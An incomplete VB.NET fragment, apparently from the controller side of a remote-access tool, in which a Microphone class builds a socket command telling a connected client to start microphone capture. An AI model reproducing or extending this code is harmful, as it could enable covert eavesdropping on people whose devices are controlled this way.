...
Public Class Microphone
    ...
    Private Sub Out_Start()
        If Not classClient Is Nothing Then
             ...
             End If
             Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & reso.HzInt(OutHZ.Text) & sockets.Data.SPL_DATA & SecurityKey.MicwaveOutByte & sockets.Data.SPL_DATA & classClient.ClientRemoteAddress & sockets.Data.SPL_DATA & "0", Codes.Encoding().GetBytes("null"), classClient}
